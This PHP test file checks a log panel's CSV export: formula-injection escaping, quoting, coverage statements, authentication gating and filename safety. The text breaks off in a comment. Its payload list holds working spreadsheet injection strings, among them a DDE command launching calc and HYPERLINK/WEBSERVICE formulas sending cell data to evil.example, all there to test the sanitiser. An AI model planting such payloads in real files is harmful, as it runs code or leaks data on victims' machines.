<?php
/**
 * Loghound — tests for the CSV export.
 *
 * Two halves, and the first one is the reason this file exists.
 *
 * FORMULA INJECTION. Every value in this product is chosen by whoever made the request, and a
 * spreadsheet evaluates a cell that begins with `=`, `+`, `-`, `@`, a TAB or a CR. An export is
 * therefore the one place Loghound hands a file to a program that will execute part of it, and
 * the payloads below are the real ones — `=cmd|' /C calc'!A0` is the DDE form that still opens a
 * process in Excel, and the padded variants are how a naive first-byte check is walked around.
 * These are pinned rather than described, because a sanitiser nobody attacks is a sanitiser that
 * works right up until somebody does.
 *
 * HONESTY ABOUT COVERAGE. The other half. A capped table exported under the name of the whole
 * population is a file somebody builds a report on, and nothing on screen can correct it once it
 * has left the product — so every export states what it covers, every column header is the word
 * the table shows rather than the field name the schema stores, and a filter with an operator on
 * it either travels with its operator or does not travel at all. "None of" arriving as "Any of"
 * would invert the meaning of the file, which is a defect this repository has been bitten by
 * before (Layout::urlWith, tests/test_security_audit.php).
 *
 * The exports are driven end to end — a real Controller subclass, a real Gateway, a real Solr
 * client over a canned transport, output captured — so what is asserted is the bytes a browser
 * would receive and not a description of them.
 *
 * @package Loghound
 * @license MIT
 */

declare(strict_types=1);

require_once __DIR__ . '/../src/autoload.php';

use Loghound\Csv;
use Loghound\Config;
use Loghound\Panel\Bots;
use Loghound\Panel\Callers;
use Loghound\Panel\Controller;
use Loghound\Panel\Fingerprints;
use Loghound\Panel\Gateway;
use Loghound\Panel\Hosts;
use Loghound\Panel\Indexes;
use Loghound\Panel\Networks;
use Loghound\Panel\Overview;
use Loghound\Panel\Performance;
use Loghound\Panel\Queries;
use Loghound\Panel\Query;
use Loghound\Panel\Sessions;
use Loghound\Panel\Usage;
use Loghound\Solr;

/** Every view that can declare an export, as slug => class. */
function lh_csv_views(): array
{
    return [
        'overview'     => Overview::class,
        'bots'         => Bots::class,
        'fingerprints' => Fingerprints::class,
        'networks'     => Networks::class,
        'sessions'     => Sessions::class,
        'performance'  => Performance::class,
        'hosts'        => Hosts::class,
        'indexes'      => Indexes::class,
        'queries'      => Queries::class,
        'callers'      => Callers::class,
        'usage'        => Usage::class,
    ];
}

/** A configuration pointed at a Solr that does not exist, with demo mode off. */
function lh_csv_config(): Config
{
    $cfg = Config::load('/nonexistent-loghound-config');
    $cfg->set('solr.base_url', 'http://127.0.0.1:65535/solr');
    $cfg->set('solr.hits_core', 'lh_csv_hits');
    $cfg->set('solr.sessions_core', 'lh_csv_sessions');
    $cfg->set('ui.timezone', 'UTC');
    return $cfg;
}

/**
 * A Gateway whose transport answers from canned JSON and touches no network.
 *
 * The REAL Solr client is used, so the queries the export issues are judged by the same
 * sanitisers production applies.
 *
 * @param array<string,mixed> $response The `response`/`facets` body Solr is to return.
 */
function lh_csv_gateway(array $response): Gateway
{
    $transport = static function (array $request) use ($response): array {
        return [
            'status' => 200,
            'body'   => (string) json_encode($response),
            'error'  => '',
        ];
    };

    $cfg = lh_csv_config();
    return new Gateway($cfg, new Solr((array) $cfg->get('solr'), $transport), false);
}

/**
 * Run one export and return exactly the bytes it wrote.
 *
 * Csv::unbuffer() is a no-op under CLI precisely so this can work; see its docblock.
 */
function lh_csv_run(Controller $view, string $dataset): string
{
    ob_start();
    try {
        $view->export($dataset);
    } finally {
        $out = (string) ob_get_clean();
    }
    return $out;
}

/**
 * Split an export into its preamble records and its table records.
 *
 * The blank record between the two is the separator the format defines.
 *
 * @return array{0:array<int,array<int,string>>,1:array<int,array<int,string>>}
 */
function lh_csv_split(string $csv): array
{
    $csv = str_starts_with($csv, Csv::bom()) ? substr($csv, strlen(Csv::bom())) : $csv;

    $path = tempnam(sys_get_temp_dir(), 'lhcsv');
    file_put_contents($path, $csv);

    $records = [];
    $fh = fopen($path, 'r');
    while (($row = fgetcsv($fh, 0, ',', '"', '')) !== false) {
        $records[] = $row;
    }
    fclose($fh);
    @unlink($path);

    $head = [];
    $body = [];
    $inBody = false;
    foreach ($records as $record) {
        if (!$inBody && ($record === [null] || $record === [''] || $record === [])) {
            $inBody = true;
            continue;
        }
        if ($inBody) {
            $body[] = $record;
        } else {
            $head[] = $record;
        }
    }

    return [$head, $body];
}

/** One preamble value by its label, or null. */
function lh_csv_meta(array $head, string $label): ?string
{
    foreach ($head as $record) {
        if (($record[0] ?? '') === $label) {
            return (string) ($record[1] ?? '');
        }
    }
    return null;
}

/** Every preamble value written under one label. */
function lh_csv_all_meta(array $head, string $label): array
{
    $out = [];
    foreach ($head as $record) {
        if (($record[0] ?? '') === $label) {
            $out[] = (string) ($record[1] ?? '');
        }
    }
    return $out;
}

/** The formula payloads, spelled exactly as an attacker would send them. */
function lh_csv_payloads(): array
{
    return [
        "=cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        '+1+1',
        '-1+1',
        "\tcalc",
        "\r=1+1",
        ' =1+1',
        '"=1+1',
        '=HYPERLINK("http://evil.example/?x="&A1,"click")',
        "=WEBSERVICE(\"http://evil.example/\")",
    ];
}

return [

/* ------------------------------------------------------------------------------------ *
 * Formula injection
 * ------------------------------------------------------------------------------------ */

'every real formula payload is neutralised, in every position an attacker can pad it from' =>
    function (): void {
        foreach (lh_csv_payloads() as $payload) {
            $out = Csv::neutralise($payload);
            lh_same("'" . $payload, $out, 'payload ' . lh_show($payload) . ' must be prefixed');
        }
    },

'the neutralised value still round-trips to exactly what arrived' =>
    /**
     * An escape that loses the value is a different bug from an escape that does not fire:
     * the reader has to be able to see what the scraper actually sent.
     */
    function (): void {
        foreach (lh_csv_payloads() as $payload) {
            $out = Csv::neutralise($payload);
            lh_same($payload, substr($out, 1), 'the apostrophe is the only thing added');
        }
    },

'a value that cannot start a formula is left exactly alone' =>
    function (): void {
        foreach ([
            '/login',
            'Mozilla/5.0 (X11; Linux x86_64)',
            'Amazon Technologies Inc.',
            'a=b',
            'x+y',
            '200',
            'https://example.com/?a=1',
        ] as $safe) {
            lh_same($safe, Csv::neutralise($safe), lh_show($safe) . ' must not gain an apostrophe');
        }
    },

'the neutralisation cannot be escaped by leading whitespace or a quote' =>
    /**
     * The documented bypass: a spreadsheet trims the padding and evaluates what is left, so a
     * check on byte zero alone passes the value straight through.
     */
    function (): void {
        foreach (["  =1+1", "\t\t=1+1", "'=1+1", '"=1+1', "` =1+1", "\n=1+1", " \t '\"=1+1"] as $padded) {
            $out = Csv::neutralise($padded);
            lh_same("'", $out[0], lh_show($padded) . ' must be prefixed despite its padding');
        }
    },

'a payload survives the whole pipeline as inert text in a real export' =>
    /**
     * End to end, because neutralise() being correct is worth nothing if a column kind
     * bypasses it. The path field is the one an attacker actually controls here.
     */
    function (): void {
        $payload = "=cmd|' /C calc'!A0";
        $saved = $_GET;
        $_GET = [];

        $view = new Overview(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets'  => [
                'count' => 1,
                'paths' => ['buckets' => [
                    ['val' => $payload, 'count' => 4],
                    ['val' => '+1+1', 'count' => 2],
                    ['val' => '/login', 'count' => 1],
                ]],
            ],
        ]));

        [, $body] = lh_csv_split(lh_csv_run($view, 'pages'));
        $_GET = $saved;

        lh_true(count($body) >= 4, 'the header and three rows are present, got ' . count($body));
        lh_same("'" . $payload, $body[1][0], 'the DDE payload is inert in the file');
        lh_same("'+1+1", $body[2][0], 'and so is the bare formula');
        lh_same('/login', $body[3][0], 'while an ordinary path is untouched');
    },

'a number is never prefixed, and is always one bare numeric literal' =>
    /**
     * Prefixing numbers would make every negative figure in the file text and break the
     * arithmetic the export exists to enable. It is safe only because number() cannot emit
     * the operator sequence that turns a leading minus into a formula.
     */
    function (): void {
        foreach ([-5, -5.25, 0, 17, '42', '-0.5', 1.0e3] as $value) {
            $out = Csv::number($value);
            lh_false(str_starts_with($out, "'"), lh_show($value) . ' must stay a number');
            lh_true(
                preg_match('/^-?\d+(\.\d+)?$/D', $out) === 1,
                lh_show($value) . ' must render as one numeric literal, got ' . lh_show($out)
            );
        }
    },

'a number that is not a number is empty, never zero' =>
    /**
     * SPEC §1: an absent measurement averaged as zero is a fabricated measurement.
     */
    function (): void {
        foreach ([null, '', 'nope', "=1+1", [], true, false] as $value) {
            lh_same('', Csv::number($value), lh_show($value) . ' must be an empty cell');
        }
    },

/* ------------------------------------------------------------------------------------ *
 * RFC 4180
 * ------------------------------------------------------------------------------------ */

'a field is quoted exactly when the grammar requires it, and quotes are doubled' =>
    function (): void {
        lh_same('plain', Csv::field('plain'), 'nothing to quote');
        lh_same('"a,b"', Csv::field('a,b'), 'a comma forces quoting');
        lh_same('"say ""hi"""', Csv::field('say "hi"'), 'an internal quote is doubled');
        lh_same("\"line\r\nbreak\"", Csv::field("line\r\nbreak"), 'a record separator inside a field');
        lh_same('" padded "', Csv::field(' padded '), 'leading and trailing space is preserved by quoting');
    },

'records end CRLF and a row is the fields joined by commas' =>
    function (): void {
        lh_same("a,b,c\r\n", Csv::row(['a', 'b', 'c']), 'RFC 4180 §2.1');
        lh_same("\"a,1\",b\r\n", Csv::row(['a,1', 'b']), 'and each field is quoted on its own terms');
    },

'the file is UTF-8 and announces itself as such' =>
    function (): void {
        lh_same("\xEF\xBB\xBF", Csv::bom(), 'the BOM is the UTF-8 one');

        $saved = $_GET;
        $_GET = [];
        $view = new Overview(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => ['count' => 1, 'paths' => ['buckets' => [['val' => '/café/naïve', 'count' => 3]]]],
        ]));
        $csv = lh_csv_run($view, 'pages');
        $_GET = $saved;

        lh_true(str_starts_with($csv, Csv::bom()), 'the export opens with the BOM');
        lh_true(mb_check_encoding($csv, 'UTF-8'), 'and the bytes are valid UTF-8');
        lh_contains($csv, '/café/naïve', 'non-ASCII text survives unchanged');
    },

'a control character is dropped rather than written into a cell' =>
    /**
     * A NUL terminates the string for several readers, so a file holding one parses
     * differently in every tool that opens it.
     */
    function (): void {
        lh_same('abc', Csv::text("a\x00b\x07c"), 'C0 controls are removed');
        lh_same('a b', Csv::text("a\tb"), 'a tab becomes a space so the value still reads');
    },

/* ------------------------------------------------------------------------------------ *
 * Dates and labels
 * ------------------------------------------------------------------------------------ */

'an instant is written in the format the panel uses everywhere else' =>
    function (): void {
        lh_same('09/11/2026 14:30:12', Csv::moment('2026-09-11T14:30:12Z'), 'mm/dd/yyyy hh:mm:ss');
        lh_same('', Csv::moment(null), 'an absent instant is an empty cell');
        lh_same('', Csv::moment('not a date'), 'and so is an unparseable one');
    },

'an instant is rendered in the panel display timezone, not blindly in UTC' =>
    /**
     * The operator set ui.timezone and the table on screen honours it; a column that
     * disagreed with the table it was exported from is a column nobody can reconcile.
     */
    function (): void {
        lh_same(
            '09/11/2026 17:30:12',
            Csv::moment('2026-09-11T14:30:12Z', 'Europe/Bucharest'),
            'the offset is applied — EEST, three hours ahead'
        );
    },

'the date format in the CSV writer matches the one the rest of the product uses' =>
    function (): void {
        $src = (string) file_get_contents(dirname(__DIR__) . '/src/Csv.php');
        lh_contains($src, "format('m/d/Y H:i:s')", 'the same pattern as Layout, Settings and bin/loghound-schema');
    },

'a header row carries human labels and never a stored field name' =>
    /**
     * Panel\Vocabulary exists because a reader who has not read src/Score/Rules.php cannot
     * act on `bot_verdict_s` or `fp_cluster_proxy_fleet`. A file is read by more people than
     * a dashboard is, so the rule is stricter here, not looser.
     */
    function (): void {
        $stored = array_keys(Query::filterFields());
        $checked = 0;

        foreach (lh_csv_views() as $slug => $class) {
            $saved = $_GET;
            $_GET = [];
            $view = new $class(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));
            $sets = $view->exports();
            $_GET = $saved;

            foreach ($sets as $key => $set) {
                foreach ((array) ($set['columns'] ?? []) as $column) {
                    $label = (string) ($column[0] ?? '');
                    lh_true($label !== '', $slug . '/' . $key . ' has a column with no header');
                    lh_false(
                        in_array($label, $stored, true),
                        $slug . '/' . $key . ' heads a column with the stored field name ' . lh_show($label)
                    );
                    lh_true(
                        preg_match('/^[a-z0-9_]+_(s|i|l|f|b|ss|ii)$/D', $label) !== 1,
                        $slug . '/' . $key . ' heads a column with a schema-shaped name ' . lh_show($label)
                    );
                    $checked++;
                }
            }
        }

        lh_true($checked > 80, 'the sweep actually saw the columns, got ' . $checked);
    },

'a dimension with a vocabulary is spoken, with the stored value kept beside it' =>
    /**
     * Rule 1 of Panel\Vocabulary: the slug stays, because it is what a filter carries and
     * what somebody greps for. It is a column of its own rather than a replacement.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];
        $view = new Bots(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => [
                'count' => 1,
                'botlike' => ['count' => 3, 'classes' => ['buckets' => [
                    ['val' => 'proxy_fleet', 'count' => 3, 'uniq_ips' => 2, 'hits' => 9, 'score' => 94.0],
                ]]],
            ],
        ]));
        [, $body] = lh_csv_split(lh_csv_run($view, 'classes'));
        $_GET = $saved;

        lh_same('Class', $body[0][0], 'the spoken column comes first');
        lh_same('Class code', $body[0][1], 'and the stored value has its own header');
        lh_same('Proxy fleet', $body[1][0], 'the value is spoken');
        lh_same('proxy_fleet', $body[1][1], 'and the slug is still there to filter and grep on');
    },

/* ------------------------------------------------------------------------------------ *
 * Scope: the file says what produced it
 * ------------------------------------------------------------------------------------ */

'the range, the host, every filter and its operator reach the file' =>
    /**
     * An export that silently ignores a filter is worse than no export, and one that drops
     * "None of" inverts the meaning of every number in it.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [
            'range' => '7d',
            'f' => [
                'host_s'        => ['0' => 'shop.example.com'],
                'bot_verdict_s' => ['0' => 'bot', '1' => 'likely_bot', 'op' => 'none'],
                'country_s'     => ['0' => 'DE'],
            ],
        ];

        $view = new Overview(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => ['count' => 0, 'paths' => ['buckets' => []]],
        ]));
        [$head] = lh_csv_split(lh_csv_run($view, 'pages'));
        $_GET = $saved;

        lh_same('Last 7 days', lh_csv_meta($head, 'Time range'), 'the range travels');
        lh_same('shop.example.com', lh_csv_meta($head, 'Virtual host'), 'the host travels');

        $filters = lh_csv_all_meta($head, 'Filter');
        lh_same(2, count($filters), 'both non-host filters are reported: ' . lh_show($filters));
        lh_contains($filters[0], 'None of', 'THE OPERATOR TRAVELS: ' . $filters[0]);
        lh_contains($filters[0], 'Verdict', 'named by its human label');
        lh_contains($filters[0], 'Bot [bot]', 'values spoken, slug kept');
        lh_contains($filters[1], 'Any of', 'and a dimension on the default operator says so too');
        lh_contains($filters[1], 'DE', 'with its value');
    },

'an unfiltered export says so rather than leaving the reader to assume it' =>
    function (): void {
        $saved = $_GET;
        $_GET = [];
        $view = new Overview(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => ['count' => 0, 'paths' => ['buckets' => []]],
        ]));
        [$head] = lh_csv_split(lh_csv_run($view, 'pages'));
        $_GET = $saved;

        lh_same('None', lh_csv_meta($head, 'Filter'), 'the absence of filters is stated');
        lh_same('All hosts', lh_csv_meta($head, 'Virtual host'), 'and so is the absence of a host');
    },

'a population toggle that lives only in the page still reaches the file' =>
    function (): void {
        $saved = $_GET;
        $_GET = ['pop' => 'bots'];
        $view = new Overview(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => ['count' => 0, 'paths' => ['buckets' => []]],
        ]));
        [$head] = lh_csv_split(lh_csv_run($view, 'pages'));
        $_GET = $saved;

        lh_same('Bots and crawlers only', lh_csv_meta($head, 'Population'), 'the toggle is named');
    },

'the sort order is named, because it decides which rows a capped export contains' =>
    function (): void {
        $saved = $_GET;
        $_GET = ['sort' => 'score'];
        $view = new Sessions(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 0, 'docs' => []],
            'facets' => ['count' => 0],
        ]));
        [$head] = lh_csv_split(lh_csv_run($view, 'sessions'));
        $_GET = $saved;

        lh_same('Highest bot score first', lh_csv_meta($head, 'Sort order'), 'spoken, not the token');
    },

'every export states what it covers, and never leaves the question open' =>
    function (): void {
        $saved = $_GET;
        $_GET = [];
        $seen = 0;

        foreach (lh_csv_views() as $slug => $class) {
            $view = new $class(lh_csv_config(), lh_csv_gateway([
                'responseHeader' => ['status' => 0],
                'response' => ['numFound' => 0, 'docs' => []],
                'facets' => ['count' => 0],
            ]));
            foreach (array_keys($view->exports()) as $key) {
                [$head] = lh_csv_split(lh_csv_run($view, $key));
                $coverage = lh_csv_meta($head, 'Coverage');
                lh_true(is_string($coverage) && $coverage !== '', $slug . '/' . $key . ' states no coverage');
                lh_same('Loghound export', $head[0][0] ?? '', $slug . '/' . $key . ' has no provenance line');
                $seen++;
            }
        }
        $_GET = $saved;

        lh_true($seen >= 18, 'the sweep ran every declared export, got ' . $seen);
    },

'a capped export says it is capped, and an uncapped one says it is complete' =>
    /**
     * The whole point. A terms facet that came back SHORT of its limit returned everything,
     * which is what lets the file claim completeness without a second Solr call; one that
     * came back AT its limit must not.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];

        $short = [];
        for ($i = 0; $i < 3; $i++) {
            $short[] = ['val' => '/p' . $i, 'count' => 10 - $i];
        }
        $full = [];
        for ($i = 0; $i < 50; $i++) {
            $full[] = ['val' => '/p' . $i, 'count' => 100 - $i];
        }

        $run = static function (array $buckets): string {
            $view = new Overview(lh_csv_config(), lh_csv_gateway([
                'responseHeader' => ['status' => 0],
                'response' => ['numFound' => 0, 'docs' => []],
                'facets' => ['count' => 1, 'paths' => ['buckets' => $buckets]],
            ]));
            [$head] = lh_csv_split(lh_csv_run($view, 'pages'));
            return (string) lh_csv_meta($head, 'Coverage');
        };

        lh_contains($run($short), 'Complete', 'a short facet is the whole set');
        $capped = $run($full);
        lh_contains($capped, 'NOT', 'a facet at its limit must not claim completeness: ' . $capped);
        lh_contains($capped, '50', 'and must name the limit it used');

        $_GET = $saved;
    },

'a paged export names both the rows it took and the rows that matched' =>
    /**
     * "A CSV named sessions containing the first page of sessions is a lie somebody will
     * build a report on." The total is Solr's numFound, which is exact.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];

        $docs = [];
        for ($i = 0; $i < 5; $i++) {
            $docs[] = ['id' => 'sess' . $i, 'ts_start' => '2026-09-11T10:0' . $i . ':00Z', 'hits_i' => $i];
        }

        $view = new Sessions(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 284193, 'docs' => $docs],
            'facets' => ['count' => 0],
        ]));
        [$head, $body] = lh_csv_split(lh_csv_run($view, 'sessions'));
        $_GET = $saved;

        $coverage = (string) lh_csv_meta($head, 'Coverage');
        lh_contains($coverage, '2,000', 'the export names the clamp it applied: ' . $coverage);
        lh_contains($coverage, '284,193', 'and the size of the set it came from');
        lh_contains($coverage, 'NOT the whole set', 'and says plainly that it is not everything');
        lh_true(count($body) > 1, 'rows were written as the pages arrived');
    },

'the clamp on a paged export is real, not only stated' =>
    /**
     * A GET whose cost is proportional to a number in the URL is a way to make the server
     * work hard from a link, so the total is clamped as well as declared.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];

        $docs = [];
        for ($i = 0; $i < 500; $i++) {
            $docs[] = ['id' => 'sess' . $i, 'ts_start' => '2026-09-11T10:00:00Z'];
        }

        $view = new Sessions(lh_csv_config(), lh_csv_gateway([
            'responseHeader' => ['status' => 0],
            'response' => ['numFound' => 999999, 'docs' => $docs],
            'facets' => ['count' => 0],
        ]));
        [, $body] = lh_csv_split(lh_csv_run($view, 'sessions'));
        $_GET = $saved;

        lh_same(2001, count($body), 'a header plus exactly the clamped 2,000 rows');
    },

'no dataset may declare a cap above the writer ceiling' =>
    function (): void {
        $saved = $_GET;
        $_GET = [];
        foreach (lh_csv_views() as $slug => $class) {
            $view = new $class(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));
            foreach ($view->exports() as $key => $set) {
                $cap = (int) ($set['cap'] ?? 0);
                lh_true($cap > 0, $slug . '/' . $key . ' declares no cap');
                lh_true(
                    $cap <= Csv::MAX_ROWS,
                    $slug . '/' . $key . ' declares a cap of ' . $cap . ' above Csv::MAX_ROWS'
                );
                lh_true(
                    isset($set['unit']) && (string) $set['unit'] !== '',
                    $slug . '/' . $key . ' does not name what a row is, so its coverage line cannot'
                );
                lh_true(
                    isset($set['label']) && (string) $set['label'] !== '',
                    $slug . '/' . $key . ' has no label, so the filename cannot distinguish it'
                );
            }
        }
        $_GET = $saved;
    },

/* ------------------------------------------------------------------------------------ *
 * The endpoint
 * ------------------------------------------------------------------------------------ */

'the export path is gated by the same authentication as the JSON path' =>
    /**
     * Not a description of the front controller: the order of the two statements in the file
     * is what makes it true, and this is what fails if a later edit moves the branch above
     * the gate.
     */
    function (): void {
        $src = (string) file_get_contents(dirname(__DIR__) . '/public/index.php');

        $auth = strpos($src, 'Security::requireAuth(');
        $export = strpos($src, "\$export = \$_GET['export']");
        $api = strpos($src, "\$action = \$_GET['api']");

        lh_true($auth !== false, 'the front controller still authenticates');
        lh_true($export !== false, 'the export branch is present');
        lh_true($api !== false, 'the JSON branch is present');
        lh_true($auth < $export, 'the export branch is BELOW requireAuth()');
        lh_true($export < $api || $auth < $api, 'both data paths are behind the same gate');
    },

'an export slug that is not a bare identifier is refused before a view sees it' =>
    function (): void {
        $src = (string) file_get_contents(dirname(__DIR__) . '/public/index.php');
        lh_contains($src, "preg_match('/^[a-z0-9_-]{1,32}\$/D', \$export)", 'the slug is shape-checked');
    },

'a dataset this view did not declare is a 404 and not an empty file' =>
    /**
     * The slugs tried are REAL ones belonging to OTHER views, which is the shape a prober would
     * use: a dataset table that was global rather than per view would answer all four.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];
        $view = new Overview(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));

        foreach (['clusters', 'sessions', 'plan', 'nope'] as $key) {
            $out = lh_csv_run($view, $key);
            lh_false(str_contains($out, 'Loghound export'), $key . ' must not produce a file on this view');
            lh_contains($out, 'no such export', 'and must say so plainly');
        }
        $_GET = $saved;
    },

'the export never builds a Solr query of its own' =>
    /**
     * The whole safety argument for the feature: a dataset NAMES an api() action, and the
     * query behind it is the one the card already runs, through the same allowlists. A
     * dataset that built its own would be a second place for a filter to go missing or for a
     * field name to be spliced into `q`, `fq`, `sort` or `fl`.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];

        foreach (lh_csv_views() as $slug => $class) {
            $view = new $class(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));
            foreach ($view->exports() as $key => $set) {
                $shape = (string) ($set['shape'] ?? 'list');
                if ($shape === 'paged') {
                    lh_true(isset($set['pager']) && is_callable($set['pager']), $slug . '/' . $key . ' has no pager');
                    continue;
                }
                if ($shape === 'custom') {
                    lh_true(isset($set['source']) && is_callable($set['source']), $slug . '/' . $key . ' has no source');
                    continue;
                }
                $action = (string) ($set['action'] ?? '');
                lh_true(
                    preg_match('/^[a-z_]{1,32}$/D', $action) === 1,
                    $slug . '/' . $key . ' names ' . lh_show($action) . ', which the front controller would refuse'
                );
                $answer = $view->api($action);
                lh_false(
                    ($answer['error'] ?? '') === 'Unknown action',
                    $slug . '/' . $key . ' names an action ' . $slug . ' does not answer: ' . lh_show($action)
                );
            }
        }
        $_GET = $saved;
    },

'only the parameters a dataset declared are carried into its link' =>
    /**
     * `carry` is what reaches the browser as data-export-carry, so it is also the list the
     * front end is allowed to set. A name outside the bare-identifier shape would be a
     * parameter nothing re-validates.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [];
        foreach (lh_csv_views() as $slug => $class) {
            $view = new $class(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));
            foreach ($view->exports() as $key => $set) {
                foreach ((array) ($set['carry'] ?? []) as $name) {
                    lh_true(
                        is_string($name) && preg_match('/^[a-z_]{1,20}$/D', $name) === 1,
                        $slug . '/' . $key . ' carries ' . lh_show($name)
                    );
                }
            }
        }
        $_GET = $saved;
    },

'a HEAD gets the headers and runs none of the queries behind them' =>
    /**
     * Otherwise HEAD is the cheapest way to make this endpoint expensive.
     */
    function (): void {
        $savedGet = $_GET;
        $savedMethod = $_SERVER['REQUEST_METHOD'] ?? null;
        $_GET = [];
        $_SERVER['REQUEST_METHOD'] = 'HEAD';

        $calls = 0;
        $cfg = lh_csv_config();
        $transport = static function (array $request) use (&$calls): array {
            $calls++;
            return ['status' => 200, 'body' => '{"responseHeader":{"status":0}}', 'error' => ''];
        };
        $view = new Overview($cfg, new Gateway($cfg, new Solr((array) $cfg->get('solr'), $transport), false));

        $out = lh_csv_run($view, 'pages');

        $_SERVER['REQUEST_METHOD'] = $savedMethod === null ? 'GET' : $savedMethod;
        $_GET = $savedGet;

        lh_same('', $out, 'a HEAD writes no body');
        lh_same(0, $calls, 'and issues no Solr query');
    },

/* ------------------------------------------------------------------------------------ *
 * The file's own name, and the control
 * ------------------------------------------------------------------------------------ */

'the filename names the view, the table, the range and the moment' =>
    /**
     * Three exports in a downloads folder have to be distinguishable without opening them.
     */
    function (): void {
        $name = Csv::filename('overview', 'Top pages', '24h');

        lh_true(str_starts_with($name, 'loghound-'), $name);
        lh_contains($name, 'overview', 'the view');
        lh_contains($name, 'top-pages', 'the table');
        lh_contains($name, '24h', 'the range');
        lh_true(str_ends_with($name, '.csv'), $name);
        lh_true(
            preg_match('/^[a-z0-9.-]+$/D', $name) === 1,
            'the name is safe in a Content-Disposition header by construction: ' . $name
        );
    },

'a hostile label cannot break out of the Content-Disposition header' =>
    function (): void {
        $name = Csv::filename('overview', "evil\"\r\nX-Injected: 1", '24h');
        lh_true(preg_match('/^[a-z0-9.-]+$/D', $name) === 1, $name);
        lh_false(str_contains($name, '"'), 'no quote survives');
        lh_false(str_contains($name, "\r"), 'and no CR');
    },

'the control is a link that already carries the range, the host and the filters' =>
    /**
     * It works with scripting off, which is the whole reason the href is built server-side.
     */
    function (): void {
        $saved = $_GET;
        $_GET = [
            'range' => '7d',
            'f' => ['country_s' => ['0' => 'DE', 'op' => 'none']],
        ];

        $view = new Overview(lh_csv_config(), lh_csv_gateway(['responseHeader' => ['status' => 0]]));
        ob_start();
        $view->body();
        $html = (string) ob_get_clean();
        $_GET = $saved;

        lh_contains($html, 'class="export"', 'the control is rendered');
        lh_contains($html, 'export=pages', 'and names its dataset');
        lh_contains($html, 'range=7d', 'the range is already in the href');
        lh_contains($html, rawurlencode('f[country_s][op]') . '=none', 'AND SO IS THE OPERATOR');
        lh_contains($html, 'aria-label="Download Top pages as CSV', 'with a name that says what it does');
        lh_contains($html, 'data-export-carry="pop"', 'and the list of page controls it may read');
    },

'the control is wired by a module, never by an inline handler' =>
    /**
     * The panel's CSP is script-src 'self' with a hash for one inline import map. An
     * onclick would be dead on arrival and a javascript: href worse than dead.
     */
    function (): void {
        $js = (string) file_get_contents(dirname(__DIR__) . '/public/assets/js/export.js');

        lh_false(str_contains($js, '.innerHTML'), 'no markup sink');
        lh_false(str_contains($js, 'javascript:'), 'no javascript: URL');
        lh_false(str_contains($js, 'eval('), 'no eval');
        lh_false((bool) preg_match('/\bon(click|load|error)\s*=/', $js), 'no inline handler');
        lh_contains($js, "addEventListener('click'", 'a delegated listener instead');

        foreach (['core.js', 'facetfilter.js'] as $file) {
            $src = (string) file_get_contents(dirname(__DIR__) . '/public/assets/js/' . $file);
            lh_contains($src, "'./export.js'", $file . ' must import it by a RELATIVE specifier');
        }
    },

'the control is styled as a chip and states both colours in every state' =>
    /**
     * The rule at the top of panel.css's button section: a rule that reacts to a pointer
     * declares BOTH background and colour, because one rule changing the ground while
     * another changes the figure is how a label disappears into a solid rectangle.
     */
    function (): void {
        $css = (string) preg_replace(
            '#/\*.*?\*/#s',
            '',
            (string) file_get_contents(dirname(__DIR__) . '/public/assets/css/panel.css')
        );

        lh_true((bool) preg_match('/\.export\s*\{([^}]*)\}/', $css, $rest), '.export is defined');
        lh_contains($rest[1], 'background:', 'the resting state names a background');
        lh_contains($rest[1], 'color:', 'and a colour');
        lh_contains($rest[1], '14px', 'and is set at the 14px floor for operator-facing text');

        lh_true(
            (bool) preg_match('/\.export:hover[^{]*\{([^}]*)\}/', $css, $hover),
            '.export has a hover state'
        );
        lh_contains($hover[1], 'background:', 'hover names a background');
        lh_contains($hover[1], 'color:', 'and a colour');

        lh_false(
            (bool) preg_match('/\.export[^{]*\{[^}]*:\s*(white|black|red|grey|gray|blue|green)\b/i', $css),
            'colour names are banned; hex only'
        );
    },

'the control survives a phone without pushing the page sideways' =>
    function (): void {
        $mobile = (string) preg_replace(
            '#/\*.*?\*/#s',
            '',
            (string) file_get_contents(dirname(__DIR__) . '/public/assets/css/mobile.css')
        );

        lh_true((bool) preg_match('/\.export\s*\{([^}]*)\}/', $mobile, $rule), '.export gets a touch target');
        lh_contains($rule[1], 'min-height: var(--lh-tap)', 'a thumb-sized one');

        $panel = (string) file_get_contents(dirname(__DIR__) . '/public/assets/css/panel.css');
        lh_contains($panel, 'white-space: nowrap', 'a two-word control must not wrap into two');
    },

    /* A CELL THAT IS NOT A MEASUREMENT MUST COME OUT EMPTY, NEVER PLAUSIBLE.
       moment() handed its value straight to DateTimeImmutable, which reads date MATH as
       willingly as a date. So a `date` column fed anything PHP recognises relatively — `now`,
       `tomorrow`, `-1 year`, `@0` — produced a correctly formatted timestamp computed from
       the moment the file was taken, and produced a DIFFERENT one on the next export. number()
